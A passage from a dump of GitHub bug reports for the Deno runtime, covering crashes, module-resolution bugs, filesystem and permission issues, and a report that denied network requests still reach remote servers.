https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLBodyElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLHeadingElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLParagraphElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLHRElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLPreElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLUListElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLOListElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLLIElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLMenuElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDListElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDivElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLAnchorElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLHyperlinkElementUtils-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLAreaElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLBRElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLButtonElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/constraint-validation/DefaultConstraintValidation-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLCanvasElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDataElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDataListElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDetailsElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDialogElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLDirectoryElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLFieldSetElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLFontElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLFormElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLHtmlElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLImageElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/SelectionMode.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLInputElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:decimal.js@10?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/number-and-date-inputs.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLLabelElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLLegendElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLMapElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLMarqueeElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/TextTrackKind.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLMediaElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLMeterElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLModElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLOptGroupElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLOptionElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLOutputElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLPictureElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLProgressElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLQuoteElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLScriptElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLSelectElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/AssignedNodesOptions.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLSlotElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLSourceElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLSpanElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableCaptionElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableCellElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableColElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTimeElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableRowElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTableSectionElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTemplateElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTextAreaElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLFrameElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLFrameSetElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLIFrameElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLEmbedElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLObjectElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLParamElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLVideoElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLAudioElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/HTMLTrackElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/SVGGraphicsElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/SVGTests-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/svg/basic-types.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/SVGSVGElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/nodes/SVGTitleElement-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/svg/SVGNumber-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/svg/SVGStringList-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/svg/SVGListBase.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/InputEventInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/events/InputEvent-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/CompositionEventInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/events/CompositionEvent-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/WheelEventInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/events/WheelEvent-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/navigator/Plugin-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/navigator/MimeType-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/file-api/FileReader-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/binary-data.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/FilePropertyBag.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/file-api/File-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/file-api/FileList-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/constraint-validation/ValidityState-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/SupportedType.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/domparsing/DOMParser-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/domparsing/XMLSerializer-impl.dew.js\r\nDownload https://dev.jspm.io/npm:w3c-xmlserializer@2?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/xhr/FormData-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/xhr/XMLHttpRequestEventTarget-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/xhr/XMLHttpRequestUpload-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/XMLHttpRequestResponseType.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/xhr/XMLHttpRequest-impl.dew.js\r\nDownload https://dev.jspm.io/npm:@jspm/core@1/nodelibs/http.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/xhr/xhr-utils.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/json.dew.js\r\nDownload https://dev.jspm.io/npm:request@2?dew\r\nDownload https://dev.jspm.io/npm:data-urls@2?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/helpers/wrap-cookie-jar-for-request.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/BinaryType.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/StaticRangeInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/range/StaticRange-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/generated/MutationObserverInit.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/mutation-observer/MutationObserver-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/fetch/Headers-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/fetch/header-types.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/fetch/header-list.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/aborting/AbortController-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/aborting/AbortSignal-impl.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/parser/xml.dew.js\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/browser/parser/html.dew.js\r\nDownload https://dev.jspm.io/npm:saxes@4?dew\r\nDownload https://dev.jspm.io/npm:parse5@5.1.1?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/lib/jsdom/living/domparsing/parse5-adapter-serialization.dew.js\r\nDownload https://dev.jspm.io/npm:parse5@5.1.1/lib/parser/open-element-stack?dew\r\nDownload https://dev.jspm.io/npm:request-promise-native@1?dew\r\nDownload https://dev.jspm.io/npm:jsdom@16.0.1/package.json.dew.js\r\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 123, kind: Other, message: \"La sintassi del nome del file, della directory o del volume non è corretta.\" }', src\\libcore\\result.rs:1165:5\r\n```\r\n</details>\r\nTried on windows 10 on version 0.31.0"},{"labels":["bug",null],"text":"Suppose `valid_symlink` points to a real target file, and `invalid_symlink` points to a non-existing file. Then:\r\n\r\n```\r\nDeno.removeSync(valid_symlink)\r\n```\r\n\r\nworks fine --- and deletes the symlink rather than its target. OK, then we would also expect:\r\n\r\n```\r\nDeno.removeSync(invalid_symlink)\r\n```\r\n\r\nto delete the symlink. But instead this fails with a `NotFound` error. (Same holds for `remove` rather than `removeSync`.)\r\n\r\nNot only is this unexpected, it looks like then there's no way for Deno to remove a dangling symlink (short of running a subprocess).\r\n\r\nLooking at the file `./cli/ops/fs.rs`, lines starting around 157 have:\r\n\r\n```\r\nfn op_remove(\r\n   ...\r\n    let metadata = fs::metadata(&path)?;\r\n```\r\n\r\nPerhaps if that's changed to [fs::symlink_metadata](https://doc.rust-lang.org/std/fs/fn.symlink_metadata.html) it'd fix the issue?\r\n\r\nI can't build Deno on my own machine to test, though."},{"labels":["bug"],"text":"Hi deno team! Amazing + inspirational product! Thank you all for creating + maintaining this beauty!\r\n\r\nI run my program `deno --allow-net app.js`\r\n\r\nAnd get this error `error: Uncaught TypeError: run again with the --allow-read flag`\r\n\r\nIs there anyway to know **who's** reading, aka: what file + line in my code base is attempting to read. And/or **what's** trying to be read, aka: this directory or file. \r\n\r\nKnowing this will help me determine if or how I'd like to grant `allow-read` access!\r\n\r\nThank you!"},{"labels":["bug"],"text":"### setTimeout in worker panicks\r\n```javascript\r\n// index.js\r\nconst worker= new Worker( './worker.js', { name:'foo', type:'module', }, );\r\n\r\nworker.onmessage= ()=> {\r\n\tconsole.log( 'done', );\r\n};\r\n\r\nworker.postMessage( {}, );\r\n```\r\n\r\n```javascript\r\n// worker.js\r\nglobalThis.onmessage= async ()=> {\r\n\t\r\n\tsetTimeout( async ()=> {}, ); // this line cause the panic\r\n\t\r\n\tglobalThis.postMessage( {}, );\r\n\t\r\n\tif( globalThis.Deno )\r\n\t\treturn globalThis.workerClose();\r\n\t\r\n\tglobalThis.close();\r\n};\r\n```\r\nIt runs fine on and before 0.30, but panick in 0.31:\r\n```bash\r\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: TryFromTypeError { expected_type: \"Uint32\" }', src/libcore/result.rs:1165:5\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\nfatal runtime error: failed to initiate panic, error 5\r\n```\r\n\r\n### open worker in worker panicks \r\n```javascript\r\n// index.js\r\nconst worker= new Worker( './worker.js', { name:'foo', type:'module', }, );\r\n\r\nworker.onmessage= ( { data:{ level, }, }, )=> {\r\n\tconsole.log( `done level ${level}`, );\r\n};\r\n\r\nworker.postMessage( { level:1, }, );\r\n```\r\n\r\n```javascript\r\n// worker.js\r\nglobalThis.onmessage= async ( { data:{ level, }, }, )=> {\r\n\t\r\n\tconsole.log( `into level ${level}`, )\r\n\t\r\n\tif( level )\r\n\t{\r\n\t\tconst worker= new Worker( './worker.js', { name:'foo', type:'module', }, );\r\n\t\t\r\n\t\tworker.onmessage= ( { data:{ level, }, }, )=> {\r\n\t\t\tconsole.log( `done level ${level}`, );\r\n\t\t};\r\n\t\t\r\n\t\tworker.postMessage( { level:level - 1, }, );\r\n\t}\r\n\t\r\n\tglobalThis.postMessage( { level, }, );\r\n\t\r\n\tif( globalThis.Deno )\r\n\t\treturn globalThis.workerClose();\r\n\t\r\n\tglobalThis.close();\r\n};\r\n```\r\nIt runs fine on and before 0.30, but panick in 0.31:\r\n```bash\r\ninto level 1\r\ninto level 0\r\ndone level 0\r\ndone level 1\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', src/libcore/option.rs:378:21\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.\r\n```\r\n\r\n#### Env\r\nUbuntu Linux 18.04\r\ndeno 0.31.0\r\nv8 8.1.108\r\ntypescript 3.7.2\r\n\r\n"},{"labels":["bug"],"text":"```\r\n> deno -V\r\ndeno 0.31.0\r\n> deno info https://deno.land/std/http/file_server.ts\r\nlocal: /Users/rld/Library/Caches/deno/deps/https/deno.land/std/http/file_server.ts\r\ntype: TypeScript\r\ncompiled: /Users/rld/Library/Caches/deno/gen/https/deno.land/std/http/file_server.ts.js\r\nmap: /Users/rld/Library/Caches/deno/gen/https/deno.land/std/http/file_server.ts.js.map\r\ndeps: cannot retrieve full dependency graph\r\n```"},{"labels":["bug"],"text":"OSX 10.14.16\r\n\r\n```bash\r\ndeno --version\r\ndeno 0.30.0\r\nv8 8.1.108\r\ntypescript 3.7.2\r\n# creates a lock file\r\ndeno run --lock=lock.json --lock-write index.ts\r\n# does NOT create a lock file\r\ndeno fetch --lock=lock.json --lock-write index.ts\r\n```"},{"labels":["bug"],"text":"i noticed something strange while trying to parse a multipart server request body. i kept getting the `UnexpectedEOFError: Unexpected EOF` error when using `MultipartReader` in[`multipart.ts`](https://github.com/denoland/deno/blob/master/std/mime/multipart.ts). example code that fails is below:\r\n\r\n```typescript\r\nconst reqBody = decoder.decode(await Deno.readAll(request.body));\r\nconst boundary = reqBody.split(\"\\n\").shift();\r\nconst mr = new MultipartReader(\r\n  request.body,\r\n  boundary\r\n);\r\nconst form = await mr.readForm(20);\r\nconsole.log(form);\r\n```\r\n\r\nhaving encountered this and not being able to debug it, i decided to clone deno and run the `multipart_test.ts` file. it worked. i then checked the `sample.txt` file it uses and saw the `^M` characters. i deleted the characters, ran the tests again and they failed. below is a screenshot of the files i tested. the top file fails and the bottom file passes.\r\n\r\n<img width=\"590\" alt=\"Screen Shot 2020-01-23 at 18 50 51\" src=\"https://user-images.githubusercontent.com/12766301/73038083-23938480-3e1f-11ea-8857-1d230942b3f4.png\">\r\n\r\nso, i think there is an issue around the way the `MultipartReader` reads new line characters in a multipart request body. i've traced the issue to this line ... \r\n\r\nhttps://github.com/denoland/deno/blob/9f1e4237a590f79fbb7748d9bfaea4a701f8f4f8/std/mime/multipart.ts#L348 \r\n\r\n... and could not find a solution."},{"labels":["bug"],"text":"Files like this:\r\n```javascript\r\n// index.js\r\nimport ('./b.js');\r\nimport ('./a.js');\r\n```\r\n```javascript\r\n// a.js\r\nimport './b.js';\r\n```\r\n```javascript\r\n// b.js\r\nimport './c.js';\r\nimport './a.js';\r\n```\r\n```javascript\r\n// c.js\r\nimport './d.js';\r\n```\r\n```javascript\r\n// d.js\r\n```\r\n\r\nThen lets run with\r\n```bash\r\ndeno --allow-read index.js\r\n```\r\nIt crash with:\r\n```\r\nerror: Uncaught Cannot resolve module \"./d.js\" from \"file:///tmp/c.js\"\r\n```\r\n\r\n\r\nLet's edit `b.js` to this\r\n```javascript\r\n// b.js\r\nimport './a.js';\r\nimport './c.js';\r\n```\r\nThen run\r\n```bash\r\ndeno --allow-read index.js\r\n```\r\nIt crash with:\r\n```\r\nerror: Uncaught Cannot resolve module \"./c.js\" from \"file:///tmp/b.js\"\r\n```\r\n\r\n* when we **dynamically** import b.js and a.js in index.js **concurrently**, and **b.js first**;\r\n* and a.js and b.js **statically** import each other;\r\n* then we cannot statically import anything in b.js after import a.js.\r\n* and we cannot statically import anything in c.js that imported by b.js before b.js import a.js.\r\n\r\n```javascript\r\n// b.js\r\nimport './a.js';\r\n// cannot statically import anything here\r\n```\r\n```javascript\r\n// c.js\r\n// cannot statically import anything here\r\n```\r\n\r\nThis BUG exists since we support `import()`. I've encountered it several times. \r\nThe first time is under 0.15 or 0.16. Today I, finally find out how to reproduce it. \r\n\r\n"},{"labels":["bug"],"text":"https://github.com/denoland/deno/blob/21cc9cb7a76d805fbb7b53583448aa101c294e71/cli/ops/fs.rs#L535-L564\r\n\r\n`op_make_temp_dir` check if we have access to `make_temp` which is not the actual path where temp directory will be created."},{"labels":["bug",null],"text":"```\r\n> await Deno.permissions.query({ name: \"read\" })\r\nerror: Uncaught SyntaxError: await is only valid in async function\r\n► <unknown>:1:1\r\n    at evaluate ($deno$/repl.ts:84:34)\r\n    at replLoop ($deno$/repl.ts:175:13)\r\n```"},{"labels":["bug"],"text":"@bartlomieju Continuing the discussion from https://gitter.im/denolife/Lobby (Jan 7th at 12:57am)\r\nYou mentioned this could be a bug, and to create an issue. This could very well be the naive implementation on my end though.\r\n\r\nThe basic idea is to gather git blame information for each line in a file. Im doing this by using `walk`, and then using `fileReadStr`, splitting the file into lines, and then creating a subprocess via `Deno.run` on each line. This works well enough for small code bases, but on normal sized codebases I run into this error:\r\n```\r\nthread '<unnamed>' panicked at 'failed to open /dev/urandom: Os { code: 24, kind: Other, message: \"Too many open files\" }', src/libcore/result.rs:1165:5\r\n```\r\n\r\nI've created a simplified version of what im building. You can run it from `https://raw.githubusercontent.com/orrybaram/morbo-deno/potential-deno-bug/mod.ts`\r\n\r\nHere's the code:\r\n```js\r\nimport { walk, readFileStr } from 'https://deno.land/std/fs/mod.ts';\r\n\r\nexport default async function run() {\r\n  for await (const { filename, info } of walk(Deno.cwd(), {\r\n    skip: [/^.*\\/\\.git$/],\r\n  })) {\r\n    if (info.isDirectory() || !info.isFile()) {\r\n      continue;\r\n    }\r\n\r\n    const file = await readFileStr(filename);\r\n    const lines = file.split('\\n');\r\n\r\n    lines.forEach(async (line, idx) => {\r\n      if (!line) {\r\n        return;\r\n      }\r\n\r\n      const lineNumber = idx + 1;\r\n\r\n      const process = Deno.run({\r\n        args: [\r\n          'git',\r\n          '-C',\r\n          Deno.cwd(),\r\n          'blame',\r\n          filename,\r\n          '-L',\r\n          `${lineNumber}, ${lineNumber}`,\r\n          '-p',\r\n        ],\r\n        stdout: 'piped',\r\n      });\r\n\r\n      await process.status();\r\n\r\n      const decoder = new TextDecoder('utf-8');\r\n      const result = await process.output();\r\n\r\n      console.log(decoder.decode(result));\r\n    });\r\n  }\r\n}\r\n```\r\n\r\n**EDIT**\r\nHere's the full backtrace. I've also realized that using a `lines.forEach` isnt truly async, but changing it to a standard for loop, although solving the order of operations, did not fix the issue.\r\n```\r\nstack backtrace:\r\n   0:        0x10d770d75 - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::hb58f5347bb1ea7b9\r\n   1:        0x10d7a02e1 - core::fmt::write::ha9abb3322774bd4f\r\n   2:        0x10d789379 - std::io::Write::write_fmt::h72ef3cad46ef5da7\r\n   3:        0x10d773363 - std::panicking::default_hook::{{closure}}::hb0f024d11ad4eda7\r\n   4:        0x10d77308f - std::panicking::default_hook::h8f36dfbe4fa71efd\r\n   5:        0x10d773a1b - std::panicking::rust_panic_with_hook::h19f1d0cf9bc48900\r\n   6:        0x10d7735a9 - std::panicking::continue_panic_fmt::ha03dadffb484b681\r\n   7:        0x10d7734f9 - rust_begin_unwind\r\n   8:        0x10e12466c - core::panicking::panic_fmt::hf2ccf250d7b43fe7\r\n   9:        0x10e124479 - core::result::unwrap_failed::h4d74b9130c1d473e\r\n  10:        0x10d773d79 - std::sys::unix::rand::imp::fill_bytes::h0e2c95cd9882e7a9\r\n  11:        0x10d76eecc - std::collections::hash::map::RandomState::new::KEYS::__getit::hd0b19463a2efedcf\r\n  12:        0x10d3c2ac0 - futures_util::future::try_future::try_chain::TryChain<Fut1,Fut2,Data>::poll::h36ab1f023ffafec1\r\n  13:        0x10d2d7534 - std::panicking::try::do_call::h0c5b5b5548539558\r\n  14:        0x10d78c63f - __rust_maybe_catch_panic\r\n  15:        0x10d2fe500 - <futures_util::future::future::catch_unwind::CatchUnwind<Fut> as core::future::future::Future>::poll::h7ae4c24334786e12\r\n  16:        0x10d3969f2 - <futures_util::future::future::remote_handle::Remote<Fut> as core::future::future::Future>::poll::h679a6e18c237e597\r\n  17:        0x10d766ff4 - futures_executor::thread_pool::PoolState::work::h1694f852a960cde0\r\n  18:        0x10d769124 - std::sys_common::backtrace::__rust_begin_short_backtrace::h1030c1feb757644a\r\n  19:        0x10d763b40 - std::panicking::try::do_call::h0e96fbb1191adb94\r\n  20:        0x10d78c63f - __rust_maybe_catch_panic\r\n  21:        0x10d763767 - core::ops::function::FnOnce::call_once{{vtable.shim}}::h42519fcc65611b64\r\n  22:        0x10d78b20e - <alloc::boxed::Box<F> as core::ops::function::FnOnce<A>>::call_once::hf60ac4339e07dd9a\r\n  23:        0x10d772a2e - std::sys_common::thread::start_thread::h8df834dce9a60e3c\r\n  24:        0x10d771539 - std::sys::unix::thread::Thread::new::thread_start::had2a8d2aa4da54b8\r\n  25:     0x7fff78aa52eb - _pthread_body\r\n  26:     0x7fff78aa8249 - _pthread_start\r\n```\r\n\r\nAny help would be appreciated!\r\n\r\n"},{"labels":["bug"],"text":"<img width=\"953\" alt=\"Screen Shot 2020-01-05 at 9 37 04 AM\" src=\"https://user-images.githubusercontent.com/80/71782183-57f4ed00-2fa5-11ea-915c-b4ce7fe52c34.png\">\r\n\r\nNot sure why but there has been no fundamental change in our asset management - so this should be solvable. "},{"labels":["bug",null],"text":"following code works at v0.27 but hangs at v0.28\r\n```ts\r\nimport { test, runIfMain } from \"https://deno.land/std@v0.27.0/testing/mod.ts\";\r\nimport { assertEquals } from \"https://deno.land/std@v0.27.0/testing/asserts.ts\";\r\nimport { serve, Server } from \"https://deno.land/std@v0.27.0/http/server.ts\";\r\n\r\nconst encoder = new TextEncoder();\r\nlet s: Server = undefined;\r\n\r\nasync function createServer() {\r\n  s = serve(\":8080\");\r\n  for await (const req of s) {\r\n    req.respond({ body: encoder.encode(req.url) });\r\n  }\r\n}\r\n\r\ntest(async function foo() {\r\n  createServer();\r\n\r\n  const res = await fetch(\"http://127.0.0.1:8080/hello\");\r\n  assertEquals(await res.text(), \"/hello\");\r\n  s.close();\r\n});\r\n\r\nrunIfMain(import.meta);\r\n```"},{"labels":["bug"],"text":"During upgrade to Tokio 0.2 I had to add implicit `flush` during `write()` op.\r\n\r\nhttps://github.com/denoland/deno/blob/46d76a7562025374600a7f866dfc68c1b7e268e9/cli/ops/io.rs#L231-L234\r\n\r\nhttps://github.com/denoland/deno/blob/46d76a7562025374600a7f866dfc68c1b7e268e9/cli/ops/io.rs#L361-L380\r\n\r\nI had no problems without `flush` locally, failures occurred during CI runs ([especially on Ubuntu](https://github.com/denoland/deno/runs/364286737)) and appeared in various tests. \r\n\r\nThe reasons for why that situation happens are not really known and current solution with `flush` should be treated as a band-aid. \r\n\r\nEventually we need to figure out what's happening and remove calls to flush (or make it explicit op `flush()`).\r\n\r\nRef #3418"},{"labels":["bug"],"text":"If you make a network request that Deno disallows because you don't have the right permissions you get an error. However the request is still sent to the remote server.\r\n\r\nFor example this will error if run without specifying `--allow-net` or `--allow-all`:\r\n\r\n```\r\nconst dat = await fetch('https://some-remote.server/data/file.txt');\r\nconsole.log(dat);\r\n```\r\n\r\nBut the request is still sent to the server.\r\n\r\nSame goes for dynamic imports:\r\n\r\n```\r\nimport('https://some-remote.server/packages/target.ts').then( m => { m.default(); });\r\n```\r\n\r\nThis errors but the request is still sent to the server.\r\n\r\nIt also does this for static imports with 